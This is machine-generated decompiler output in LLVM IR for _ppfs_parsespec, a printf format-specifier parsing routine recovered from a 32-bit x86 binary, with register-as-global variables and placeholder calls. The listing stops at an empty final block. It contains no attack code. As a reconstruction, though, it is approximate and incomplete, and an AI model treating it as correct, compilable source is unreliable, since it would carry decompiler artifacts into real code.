define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ad46 = load i32, i32* @edi, align 4
  %v0_804ad47 = load i32, i32* @esi, align 4
  %v0_804ad48 = load i32, i32* @ebx, align 4
  store i32 %v0_804ad48, i32* %stack_var_-16, align 4
  %v4_804ad48 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ad74 = add i32 %tmp76, 24
  %v2_804ad74 = inttoptr i32 %v1_804ad74 to i32*
  %v3_804ad74 = load i32, i32* %v2_804ad74, align 4
  store i32 %v3_804ad74, i32* %eax.global-to-local, align 4
  %v1_804ad7b = add i32 %tmp76, 16
  %v2_804ad7b = inttoptr i32 %v1_804ad7b to i32*
  %v3_804ad7b = load i32, i32* %v2_804ad7b, align 4
  %v1_804ad7e = and i32 %v3_804ad7b, 128
  %v2_804ad7e = icmp eq i32 %v1_804ad7e, 0
  store i32 %v1_804ad7e, i32* %edi.global-to-local, align 4
  %v1_804ad84 = icmp eq i1 %v2_804ad7e, false
  br i1 %v1_804ad84, label %dec_label_pc_804ad97, label %dec_label_pc_804ad86

dec_label_pc_804ad86:                             ; preds = %entry
  %v2_804ad86 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804ade4.outer

dec_label_pc_804ad91:                             ; preds = %dec_label_pc_804af1f
  %v1_804ad91 = add i32 %v0_804af1f.pre.pre, 1
  store i32 %v1_804ad91, i32* @esi, align 4
  br label %dec_label_pc_804af2f

dec_label_pc_804ad97:                             ; preds = %entry
  %v15_804ad49 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ad99

dec_label_pc_804ad99:                             ; preds = %dec_label_pc_804adc1.dec_label_pc_804ad99_crit_edge, %dec_label_pc_804ad97
  %v2_804adaa = phi i32 [ %v2_804adaa.pre, %dec_label_pc_804adc1.dec_label_pc_804ad99_crit_edge ], [ %v15_804ad49, %dec_label_pc_804ad97 ]
  %v3_804adaa = phi i32 [ %v1_804adc1, %dec_label_pc_804adc1.dec_label_pc_804ad99_crit_edge ], [ 0, %dec_label_pc_804ad97 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ad9d = mul i32 %v3_804adaa, 4
  store i32 %v1_804ad9d, i32* @ecx, align 4
  %v2_804ada4 = load i32, i32* %arg1, align 4
  store i32 %v2_804ada4, i32* @edx, align 4
  %v2_804ada6 = add i32 %v1_804ad9d, -4
  %v3_804ada6 = add i32 %v2_804ada6, %v2_804ada4
  %v4_804ada6 = inttoptr i32 %v3_804ada6 to i32*
  %v5_804ada6 = load i32, i32* %v4_804ada6, align 4
  store i32 %v5_804ada6, i32* %eax.global-to-local, align 4
  %v1_804adaa = trunc i32 %v5_804ada6 to i8
  %v4_804adaa = add i32 %v2_804adaa, 36
  %v5_804adaa = add i32 %v4_804adaa, %v3_804adaa
  %v6_804adaa = inttoptr i32 %v5_804adaa to i8*
  store i8 %v1_804adaa, i8* %v6_804adaa, align 1
  %v0_804adae = load i32, i32* %eax.global-to-local, align 4
  %v1_804adae = urem i32 %v0_804adae, 256
  %v2_804adae = load i32, i32* @ebx, align 4
  %v3_804adae = and i32 %v2_804adae, -256
  %v4_804adae = or i32 %v3_804adae, %v1_804adae
  store i32 %v4_804adae, i32* @ebx, align 4
  %v1_804adb0 = mul i32 %v0_804adae, 16777216
  %v2_804adb0 = sdiv i32 %v1_804adb0, 16777216
  store i32 %v2_804adb0, i32* %eax.global-to-local, align 4
  %v1_804adb3 = load i32, i32* @edx, align 4
  %v2_804adb3 = load i32, i32* @ecx, align 4
  %v3_804adb3 = add i32 %v1_804adb3, -4
  %v4_804adb3 = add i32 %v3_804adb3, %v2_804adb3
  %v5_804adb3 = inttoptr i32 %v4_804adb3 to i32*
  %v6_804adb3 = load i32, i32* %v5_804adb3, align 4
  %v17_804adb3 = icmp eq i32 %v2_804adb0, %v6_804adb3
  %v1_804adb7 = icmp eq i1 %v17_804adb3, false
  br i1 %v1_804adb7, label %dec_label_pc_804b100, label %dec_label_pc_804adbd

dec_label_pc_804adbd:                             ; preds = %dec_label_pc_804ad99
  %v3_804adbd = trunc i32 %v0_804adae to i8
  %v4_804adbd = icmp eq i8 %v3_804adbd, 0
  br i1 %v4_804adbd, label %dec_label_pc_804adc7, label %dec_label_pc_804adc1

dec_label_pc_804adc1:                             ; preds = %dec_label_pc_804adbd
  %v0_804adc1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804adc1 = add i32 %v0_804adc1, 1
  store i32 %v1_804adc1, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804adc1, 32
  br i1 %tmp175, label %dec_label_pc_804adc1.dec_label_pc_804ad99_crit_edge, label %dec_label_pc_804adc7

dec_label_pc_804adc1.dec_label_pc_804ad99_crit_edge: ; preds = %dec_label_pc_804adc1
  %v2_804adaa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ad99

dec_label_pc_804adc7:                             ; preds = %dec_label_pc_804adc1, %dec_label_pc_804adbd
  %v2_804adcc = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804ade4.outer

dec_label_pc_804ade4.outer:                       ; preds = %dec_label_pc_804adc7, %dec_label_pc_804ad86, %dec_label_pc_804af01
  %v0_804adf0.ph94 = phi i32 [ %v1_804af01, %dec_label_pc_804af01 ], [ %v2_804ad86, %dec_label_pc_804ad86 ], [ %v2_804adcc, %dec_label_pc_804adc7 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804af01 ], [ %tmp66, %dec_label_pc_804ad86 ], [ %tmp66, %dec_label_pc_804adc7 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804ad8a, %dec_label_pc_804af01 ], [ 0, %dec_label_pc_804ad86 ], [ 0, %dec_label_pc_804adc7 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804af01 ], [ %v3_804ad74, %dec_label_pc_804ad86 ], [ %v3_804ad74, %dec_label_pc_804adc7 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804af01 ], [ 0, %dec_label_pc_804ad86 ], [ 0, %dec_label_pc_804adc7 ]
  %v7_804adeb = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804adeb = trunc i64 %v7_804adeb to i32
  %v2_804adf3 = add i32 %v8_804adeb, 80
  br label %dec_label_pc_804ade4

dec_label_pc_804ade4:                             ; preds = %dec_label_pc_804ade4.outer, %dec_label_pc_804aea1
  %v0_804adf0 = phi i32 [ %v0_804aeae, %dec_label_pc_804aea1 ], [ %v0_804adf0.ph94, %dec_label_pc_804ade4.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804aea1 ], [ %stack_var_-32.1.ph, %dec_label_pc_804ade4.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804aea1 ], [ %stack_var_-88.1.ph, %dec_label_pc_804ade4.outer ]
  store i32 %v0_804adf0, i32* @edx, align 4
  store i32 %v0_804adf0, i32* @esi, align 4
  %v1_804ade6 = inttoptr i32 %v0_804adf0 to i8*
  %v2_804ade6 = load i8, i8* %v1_804ade6, align 1
  %v11_804ade6 = icmp eq i8 %v2_804ade6, 42
  %v1_804ade9 = icmp eq i1 %v11_804ade6, false
  br i1 %v1_804ade9, label %dec_label_pc_804adfb, label %dec_label_pc_804adeb

dec_label_pc_804adeb:                             ; preds = %dec_label_pc_804ade4
  store i32 %v8_804adeb, i32* %eax.global-to-local, align 4
  %v1_804adf0 = add i32 %v0_804adf0, 1
  store i32 %v1_804adf0, i32* @esi, align 4
  %v0_804adf3 = load i32, i32* @esp, align 4
  %v3_804adf3 = add i32 %v2_804adf3, %v0_804adf3
  %v4_804adf3 = inttoptr i32 %v3_804adf3 to i32*
  store i32 0, i32* %v4_804adf3, align 4
  %v0_804ae15.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804adfb

dec_label_pc_804adfb:                             ; preds = %dec_label_pc_804ade4, %dec_label_pc_804adeb
  %v0_804ae15.pre = phi i32 [ %v0_804adf0, %dec_label_pc_804ade4 ], [ %v0_804ae15.pre.pre, %dec_label_pc_804adeb ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804adfd = load i32, i32* inttoptr (i32 134562592 to i32*), align 32
  store i32 %v0_804adfd, i32* %ebp.global-to-local, align 4
  %v4_804ae15.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae15124 = inttoptr i32 %v0_804ae15.pre to i8*
  %v2_804ae15125 = load i8, i8* %v1_804ae15124, align 1
  %v3_804ae15126 = zext i8 %v2_804ae15125 to i32
  %v5_804ae15127 = and i32 %v4_804ae15.pre, -256
  %v6_804ae15128 = or i32 %v3_804ae15126, %v5_804ae15127
  store i32 %v6_804ae15128, i32* %eax.global-to-local, align 4
  %v2_804ae17129 = sext i8 %v2_804ae15125 to i32
  store i32 %v2_804ae17129, i32* @ecx, align 4
  %v2_804ae1a130 = mul nsw i32 %v2_804ae17129, 2
  %v3_804ae1a131 = add i32 %v2_804ae1a130, %v0_804adfd
  %v4_804ae1a132 = inttoptr i32 %v3_804ae1a131 to i8*
  %v5_804ae1a133 = load i8, i8* %v4_804ae1a132, align 1
  %v6_804ae1a134 = and i8 %v5_804ae1a133, 8
  %v7_804ae1a135 = icmp eq i8 %v6_804ae1a134, 0
  %v1_804ae1f136 = icmp eq i1 %v7_804ae1a135, false
  br i1 %v1_804ae1f136, label %dec_label_pc_804ae05, label %dec_label_pc_804ae21

dec_label_pc_804ae05:                             ; preds = %dec_label_pc_804adfb, %dec_label_pc_804ae14
  %v2_804ae17140 = phi i32 [ %v2_804ae17, %dec_label_pc_804ae14 ], [ %v2_804ae17129, %dec_label_pc_804adfb ]
  %v6_804ae15139 = phi i32 [ %v6_804ae15, %dec_label_pc_804ae14 ], [ %v6_804ae15128, %dec_label_pc_804adfb ]
  %v0_804ae14138 = phi i32 [ %v1_804ae14, %dec_label_pc_804ae14 ], [ %v0_804ae15.pre, %dec_label_pc_804adfb ]
  %v1_804ae0d137 = phi i32 [ %v0_804ae2f32, %dec_label_pc_804ae14 ], [ 0, %dec_label_pc_804adfb ]
  %v1_804ae05 = add i32 %v1_804ae0d137, -4094
  %v6_804ae05 = sub i32 4093, %v1_804ae0d137
  %v7_804ae05 = and i32 %v6_804ae05, %v1_804ae0d137
  %v8_804ae05 = icmp slt i32 %v7_804ae05, 0
  %v9_804ae05 = icmp eq i32 %v1_804ae05, 0
  %v10_804ae05 = icmp slt i32 %v1_804ae05, 0
  %v3_804ae0b = icmp eq i1 %v10_804ae05, %v8_804ae05
  %v4_804ae0b = icmp eq i1 %v9_804ae05, false
  %v5_804ae0b = and i1 %v4_804ae0b, %v3_804ae0b
  br i1 %v5_804ae0b, label %dec_label_pc_804ae14, label %dec_label_pc_804ae0d

dec_label_pc_804ae0d:                             ; preds = %dec_label_pc_804ae05
  %v3_804ae0d = mul i32 %v1_804ae0d137, 10
  store i32 %v3_804ae0d, i32* %eax.global-to-local, align 4
  %v2_804ae10 = add i32 %v3_804ae0d, -48
  %v3_804ae10 = add i32 %v2_804ae10, %v2_804ae17140
  store i32 %v3_804ae10, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ae14

dec_label_pc_804ae14:                             ; preds = %dec_label_pc_804ae05, %dec_label_pc_804ae0d
  %v0_804ae2f32 = phi i32 [ %v1_804ae0d137, %dec_label_pc_804ae05 ], [ %v3_804ae10, %dec_label_pc_804ae0d ]
  %v4_804ae1528 = phi i32 [ %v6_804ae15139, %dec_label_pc_804ae05 ], [ %v3_804ae0d, %dec_label_pc_804ae0d ]
  %v1_804ae14 = add i32 %v0_804ae14138, 1
  store i32 %v1_804ae14, i32* @esi, align 4
  %v1_804ae15 = inttoptr i32 %v1_804ae14 to i8*
  %v2_804ae15 = load i8, i8* %v1_804ae15, align 1
  %v3_804ae15 = zext i8 %v2_804ae15 to i32
  %v5_804ae15 = and i32 %v4_804ae1528, -256
  %v6_804ae15 = or i32 %v3_804ae15, %v5_804ae15
  store i32 %v6_804ae15, i32* %eax.global-to-local, align 4
  %v2_804ae17 = sext i8 %v2_804ae15 to i32
  store i32 %v2_804ae17, i32* @ecx, align 4
  %v2_804ae1a = mul nsw i32 %v2_804ae17, 2
  %v3_804ae1a = add i32 %v2_804ae1a, %v0_804adfd
  %v4_804ae1a = inttoptr i32 %v3_804ae1a to i8*
  %v5_804ae1a = load i8, i8* %v4_804ae1a, align 1
  %v6_804ae1a = and i8 %v5_804ae1a, 8
  %v7_804ae1a = icmp eq i8 %v6_804ae1a, 0
  %v1_804ae1f = icmp eq i1 %v7_804ae1a, false
  br i1 %v1_804ae1f, label %dec_label_pc_804ae05, label %dec_label_pc_804ae21

dec_label_pc_804ae21:                             ; preds = %dec_label_pc_804ae14, %dec_label_pc_804adfb
  %v1_804ae0d.lcssa = phi i32 [ 0, %dec_label_pc_804adfb ], [ %v0_804ae2f32, %dec_label_pc_804ae14 ]
  %v0_804ae14.lcssa = phi i32 [ %v0_804ae15.pre, %dec_label_pc_804adfb ], [ %v1_804ae14, %dec_label_pc_804ae14 ]
  %v2_804ae15.lcssa = phi i8 [ %v2_804ae15125, %dec_label_pc_804adfb ], [ %v2_804ae15, %dec_label_pc_804ae14 ]
  %v6_804ae15.lcssa = phi i32 [ %v6_804ae15128, %dec_label_pc_804adfb ], [ %v6_804ae15, %dec_label_pc_804ae14 ]
  %v0_804ae21 = load i32, i32* @edx, align 4
  %v1_804ae21 = add i32 %v0_804ae21, -1
  %v2_804ae21 = inttoptr i32 %v1_804ae21 to i8*
  %v3_804ae21 = load i8, i8* %v2_804ae21, align 1
  %v12_804ae21 = icmp eq i8 %v3_804ae21, 37
  %v1_804ae25 = icmp eq i1 %v12_804ae21, false
  br i1 %v1_804ae25, label %dec_label_pc_804aeb8, label %dec_label_pc_804ae2b

dec_label_pc_804ae2b:                             ; preds = %dec_label_pc_804ae21
  %v10_804ae2b = icmp eq i8 %v2_804ae15.lcssa, 36
  %v1_804ae2d = icmp eq i1 %v10_804ae2b, false
  br i1 %v1_804ae2d, label %dec_label_pc_804ae5f, label %dec_label_pc_804ae2f

dec_label_pc_804ae2f:                             ; preds = %dec_label_pc_804ae2b
  %tmp89 = icmp slt i32 %v1_804ae0d.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804ae5f, label %dec_label_pc_804ae33

dec_label_pc_804ae33:                             ; preds = %dec_label_pc_804ae2f
  %v1_804ae33 = add i32 %v0_804ae14.lcssa, 1
  store i32 %v1_804ae33, i32* @edx, align 4
  %v4_804ae36 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804ae36, label %dec_label_pc_804b100, label %dec_label_pc_804ae41

dec_label_pc_804ae41:                             ; preds = %dec_label_pc_804ae33
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804ae49 = sub i32 %v1_804ae0d.lcssa, %stack_var_-88.1
  %v8_804ae49 = xor i32 %v1_804ae0d.lcssa, %stack_var_-88.1
  %v9_804ae49 = xor i32 %v2_804ae49, %v1_804ae0d.lcssa
  %v10_804ae49 = and i32 %v9_804ae49, %v8_804ae49
  %v11_804ae49 = icmp slt i32 %v10_804ae49, 0
  %v12_804ae49 = icmp eq i32 %v2_804ae49, 0
  %v13_804ae49 = icmp slt i32 %v2_804ae49, 0
  %v3_804ae4b = icmp ne i1 %v13_804ae49, %v11_804ae49
  %v4_804ae4b = or i1 %v12_804ae49, %v3_804ae4b
  %stack_var_-88.1.v0_804ae4d = select i1 %v4_804ae4b, i32 %stack_var_-88.1, i32 %v1_804ae0d.lcssa
  br label %dec_label_pc_804ae5b

dec_label_pc_804ae5b:                             ; preds = %dec_label_pc_804ae6f, %dec_label_pc_804ae41, %dec_label_pc_804ae73
  %v0_804ae5b = phi i32 [ %v1_804ae33, %dec_label_pc_804ae41 ], [ %v0_804ae21, %dec_label_pc_804ae73 ], [ %v0_804ae21, %dec_label_pc_804ae6f ]
  %stack_var_-32.2 = phi i32 [ %v1_804ae0d.lcssa, %dec_label_pc_804ae41 ], [ %stack_var_-32.1, %dec_label_pc_804ae73 ], [ %stack_var_-32.1, %dec_label_pc_804ae6f ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804ae4d, %dec_label_pc_804ae41 ], [ 0, %dec_label_pc_804ae73 ], [ 0, %dec_label_pc_804ae6f ]
  store i32 %v0_804ae5b, i32* @esi, align 4
  br label %dec_label_pc_804ae82

dec_label_pc_804ae5f:                             ; preds = %dec_label_pc_804ae2f, %dec_label_pc_804ae2b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804ae6f, label %dec_label_pc_804ae66

dec_label_pc_804ae66:                             ; preds = %dec_label_pc_804ae5f
  %v10_804ae66 = icmp eq i8 %v2_804ae15.lcssa, 109
  br i1 %v10_804ae66, label %dec_label_pc_804aeb8, label %dec_label_pc_804b100

dec_label_pc_804ae6f:                             ; preds = %dec_label_pc_804ae5f
  %tmp176 = icmp ugt i32 %v0_804ae14.lcssa, %v0_804ae21
  br i1 %tmp176, label %dec_label_pc_804ae73, label %dec_label_pc_804ae5b

dec_label_pc_804ae73:                             ; preds = %dec_label_pc_804ae6f
  %v1_804ae73 = inttoptr i32 %v0_804ae21 to i8*
  %v2_804ae73 = load i8, i8* %v1_804ae73, align 1
  %v8_804ae73 = icmp eq i8 %v2_804ae73, 48
  br i1 %v8_804ae73, label %dec_label_pc_804ae5b, label %dec_label_pc_804aeb8

dec_label_pc_804ae82:                             ; preds = %dec_label_pc_804ae93, %dec_label_pc_804ae5b
  %v0_804aeae = phi i32 [ %v1_804ae93, %dec_label_pc_804ae93 ], [ %v0_804ae5b, %dec_label_pc_804ae5b ]
  %v4_804ae8c35 = phi i32 [ %v6_804ae8c, %dec_label_pc_804ae93 ], [ %v6_804ae15.lcssa, %dec_label_pc_804ae5b ]
  store i32 ptrtoint ([8 x i8]* @global_var_805162a.327 to i32), i32* %edx.global-to-local, align 4
  %v1_804ae8f = inttoptr i32 %v0_804aeae to i8*
  br label %dec_label_pc_804ae8c

dec_label_pc_804ae8c:                             ; preds = %dec_label_pc_804ae9d, %dec_label_pc_804ae82
  %v4_804ae8c = phi i32 [ %v4_804ae8c35, %dec_label_pc_804ae82 ], [ %v6_804ae8c, %dec_label_pc_804ae9d ]
  %v0_804ae8e = phi i32 [ ptrtoint ([8 x i8]* @global_var_805162a.327 to i32), %dec_label_pc_804ae82 ], [ %v1_804ae8e, %dec_label_pc_804ae9d ]
  %v0_804ae9d = phi i32 [ 1, %dec_label_pc_804ae82 ], [ %v2_804ae9d, %dec_label_pc_804ae9d ]
  store i32 %v0_804ae9d, i32* @ecx, align 4
  %v1_804ae8c = inttoptr i32 %v0_804ae8e to i8*
  %v2_804ae8c = load i8, i8* %v1_804ae8c, align 1
  %v3_804ae8c = zext i8 %v2_804ae8c to i32
  %v5_804ae8c = and i32 %v4_804ae8c, -256
  %v6_804ae8c = or i32 %v3_804ae8c, %v5_804ae8c
  store i32 %v6_804ae8c, i32* %eax.global-to-local, align 4
  %v1_804ae8e = add i32 %v0_804ae8e, 1
  store i32 %v1_804ae8e, i32* @edx, align 4
  %v2_804ae8f = load i8, i8* %v1_804ae8f, align 1
  %v15_804ae8f = icmp eq i8 %v2_804ae8f, %v2_804ae8c
  %v1_804ae91 = icmp eq i1 %v15_804ae8f, false
  br i1 %v1_804ae91, label %dec_label_pc_804ae98, label %dec_label_pc_804ae93

dec_label_pc_804ae93:                             ; preds = %dec_label_pc_804ae8c
  %v1_804ae93 = add i32 %v0_804aeae, 1
  store i32 %v1_804ae93, i32* @esi, align 4
  %v0_804ae94 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ae94 = or i32 %v0_804ae94, %v0_804ae9d
  store i32 %v2_804ae94, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ae82

dec_label_pc_804ae98:                             ; preds = %dec_label_pc_804ae8c
  %v1_804ae98 = inttoptr i32 %v1_804ae8e to i8*
  %v2_804ae98 = load i8, i8* %v1_804ae98, align 1
  %v3_804ae98 = icmp eq i8 %v2_804ae98, 0
  br i1 %v3_804ae98, label %dec_label_pc_804aea1, label %dec_label_pc_804ae9d

dec_label_pc_804ae9d:                             ; preds = %dec_label_pc_804ae98
  %v2_804ae9d = mul i32 %v0_804ae9d, 2
  br label %dec_label_pc_804ae8c

dec_label_pc_804aea1:                             ; preds = %dec_label_pc_804ae98
  %v0_804aea1 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804aea5 = udiv i32 %v0_804aea1, 2
  %v1_804aea5.not = or i32 %v1_804aea5, -6
  %v1_804aeaa = xor i32 %v1_804aea5.not, 5
  store i32 %v1_804aeaa, i32* %eax.global-to-local, align 4
  %v2_804aeac = and i32 %v1_804aeaa, %v0_804aea1
  store i32 %v2_804aeac, i32* %edi.global-to-local, align 4
  %v1_804aeae = add i32 %v0_804aeae, -1
  %v2_804aeae = inttoptr i32 %v1_804aeae to i8*
  %v3_804aeae = load i8, i8* %v2_804aeae, align 1
  %v12_804aeae = icmp eq i8 %v3_804aeae, 37
  %v1_804aeb2 = icmp eq i1 %v12_804aeae, false
  br i1 %v1_804aeb2, label %dec_label_pc_804ade4, label %dec_label_pc_804aeb8

dec_label_pc_804aeb8:                             ; preds = %dec_label_pc_804ae73, %dec_label_pc_804aea1, %dec_label_pc_804ae21, %dec_label_pc_804ae66
  %v0_804aedb = phi i32 [ %v1_804ae0d.lcssa, %dec_label_pc_804ae66 ], [ %v1_804ae0d.lcssa, %dec_label_pc_804ae73 ], [ 0, %dec_label_pc_804aea1 ], [ %v1_804ae0d.lcssa, %dec_label_pc_804ae21 ]
  %v1_804aee4 = phi i32 [ %v0_804ae14.lcssa, %dec_label_pc_804ae66 ], [ %v0_804ae14.lcssa, %dec_label_pc_804ae73 ], [ %v0_804aeae, %dec_label_pc_804aea1 ], [ %v0_804ae14.lcssa, %dec_label_pc_804ae21 ]
  %v0_804aee1 = phi i32 [ %v0_804ae21, %dec_label_pc_804ae66 ], [ %v0_804ae21, %dec_label_pc_804ae73 ], [ %v1_804ae8e, %dec_label_pc_804aea1 ], [ %v0_804ae21, %dec_label_pc_804ae21 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804ae66 ], [ %stack_var_-32.1, %dec_label_pc_804ae73 ], [ %stack_var_-32.2, %dec_label_pc_804aea1 ], [ %stack_var_-32.1, %dec_label_pc_804ae21 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804ae66 ], [ 0, %dec_label_pc_804ae73 ], [ %stack_var_-88.2, %dec_label_pc_804aea1 ], [ %stack_var_-88.1, %dec_label_pc_804ae21 ]
  %v1_804aeb8 = inttoptr i32 %v0_804aee1 to i8*
  %v2_804aeb8 = load i8, i8* %v1_804aeb8, align 1
  %v11_804aeb8 = icmp eq i8 %v2_804aeb8, 42
  %v1_804aebb = icmp eq i1 %v11_804aeb8, false
  br i1 %v1_804aebb, label %dec_label_pc_804aef1, label %dec_label_pc_804aebd

dec_label_pc_804aebd:                             ; preds = %dec_label_pc_804aeb8
  %v4_804aebd = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804aebd, label %dec_label_pc_804aee1, label %dec_label_pc_804aec4

dec_label_pc_804aec4:                             ; preds = %dec_label_pc_804aebd
  %v1_804aec4 = inttoptr i32 %v1_804aee4 to i8*
  %v2_804aec4 = load i8, i8* %v1_804aec4, align 1
  %v11_804aec4 = icmp eq i8 %v2_804aec4, 36
  %v1_804aec7 = icmp eq i1 %v11_804aec4, false
  br i1 %v1_804aec7, label %dec_label_pc_804b100, label %dec_label_pc_804aecd

dec_label_pc_804aecd:                             ; preds = %dec_label_pc_804aec4
  %tmp91 = icmp slt i32 %v0_804aedb, 1
  br i1 %tmp91, label %dec_label_pc_804b100, label %dec_label_pc_804aed5

dec_label_pc_804aed5:                             ; preds = %dec_label_pc_804aecd
  store i32 %v8_804adeb, i32* %eax.global-to-local, align 4
  %v1_804aeda = add i32 %v1_804aee4, 1
  store i32 %v1_804aeda, i32* @esi, align 4
  %v1_804aedb = load i32, i32* @esp, align 4
  %v3_804aedb = add i32 %v8_804adeb, 68
  %v4_804aedb = add i32 %v3_804aedb, %v1_804aedb
  %v5_804aedb = inttoptr i32 %v4_804aedb to i32*
  store i32 %v0_804aedb, i32* %v5_804aedb, align 4
  %v0_804af1f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804aeec

dec_label_pc_804aee1:                             ; preds = %dec_label_pc_804aebd
  %v1_804aee1 = add i32 %v0_804aee1, 1
  store i32 %v1_804aee1, i32* %eax.global-to-local, align 4
  %v12_804aee4 = icmp eq i32 %v1_804aee1, %v1_804aee4
  %v1_804aee6 = icmp eq i1 %v12_804aee4, false
  br i1 %v1_804aee6, label %dec_label_pc_804b100, label %dec_label_pc_804aeec

dec_label_pc_804aeec:                             ; preds = %dec_label_pc_804aee1, %dec_label_pc_804aed5
  %v0_804af1f.pre.pre.pre = phi i32 [ %v1_804aee4, %dec_label_pc_804aee1 ], [ %v0_804af1f.pre.pre.pre.pre, %dec_label_pc_804aed5 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804aef1

dec_label_pc_804aef1:                             ; preds = %dec_label_pc_804aeb8, %dec_label_pc_804aeec
  %v0_804af1f.pre.pre = phi i32 [ %v1_804aee4, %dec_label_pc_804aeb8 ], [ %v0_804af1f.pre.pre.pre, %dec_label_pc_804aeec ]
  %v0_804ad8a = phi i32 [ %v0_804aedb, %dec_label_pc_804aeb8 ], [ -2147483648, %dec_label_pc_804aeec ]
  %v4_804aef1 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804aef1 = icmp eq i32 %v4_804aef1, 0
  %v1_804aef6 = icmp eq i1 %v5_804aef1, false
  %.pre = inttoptr i32 %v0_804af1f.pre.pre to i8*
  br i1 %v1_804aef6, label %dec_label_pc_804af1a, label %dec_label_pc_804aefc

dec_label_pc_804aefc:                             ; preds = %dec_label_pc_804aef1
  %v2_804aefc = load i8, i8* %.pre, align 1
  %v11_804aefc = icmp eq i8 %v2_804aefc, 46
  %v1_804aeff = icmp eq i1 %v11_804aefc, false
  br i1 %v1_804aeff, label %dec_label_pc_804af13, label %dec_label_pc_804af01

dec_label_pc_804af01:                             ; preds = %dec_label_pc_804aefc
  %v1_804af01 = add i32 %v0_804af1f.pre.pre, 1
  store i32 %v1_804af01, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ade4.outer

dec_label_pc_804af13:                             ; preds = %dec_label_pc_804aefc
  br label %dec_label_pc_804af1a

dec_label_pc_804af1a:                             ; preds = %dec_label_pc_804aef1, %dec_label_pc_804af13
  %stack_var_-96.2 = phi i32 [ %v0_804ad8a, %dec_label_pc_804af13 ], [ %stack_var_-96.1.ph, %dec_label_pc_804aef1 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804af13 ], [ %v0_804ad8a, %dec_label_pc_804aef1 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80515d8.328 to i32), i32* @edx, align 4
  %v4_804af1f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af1f

dec_label_pc_804af1f:                             ; preds = %dec_label_pc_804af29, %dec_label_pc_804af1a
  %v0_804af29 = phi i32 [ %v1_804af29, %dec_label_pc_804af29 ], [ ptrtoint ([9 x i8]* @global_var_80515d8.328 to i32), %dec_label_pc_804af1a ]
  %v4_804af1f = phi i32 [ %v6_804af1f, %dec_label_pc_804af29 ], [ %v4_804af1f.pre, %dec_label_pc_804af1a ]
  %v2_804af1f = load i8, i8* %.pre, align 1
  %v3_804af1f = zext i8 %v2_804af1f to i32
  %v5_804af1f = and i32 %v4_804af1f, -256
  %v6_804af1f = or i32 %v3_804af1f, %v5_804af1f
  store i32 %v6_804af1f, i32* %eax.global-to-local, align 4
  %v3_804af21 = inttoptr i32 %v0_804af29 to i8*
  %v4_804af21 = load i8, i8* %v3_804af21, align 1
  %v15_804af21 = icmp eq i8 %v2_804af1f, %v4_804af21
  br i1 %v15_804af21, label %dec_label_pc_804ad91, label %dec_label_pc_804af29

dec_label_pc_804af29:                             ; preds = %dec_label_pc_804af1f
  %v1_804af29 = add i32 %v0_804af29, 1
  store i32 %v1_804af29, i32* @edx, align 4
  %v1_804af2a = inttoptr i32 %v1_804af29 to i8*
  %v2_804af2a = load i8, i8* %v1_804af2a, align 1
  %v3_804af2a = icmp eq i8 %v2_804af2a, 0
  %v1_804af2d = icmp eq i1 %v3_804af2a, false
  br i1 %v1_804af2d, label %dec_label_pc_804af1f, label %dec_label_pc_804af2f

dec_label_pc_804af2f:                             ; preds = %dec_label_pc_804af29, %dec_label_pc_804ad91
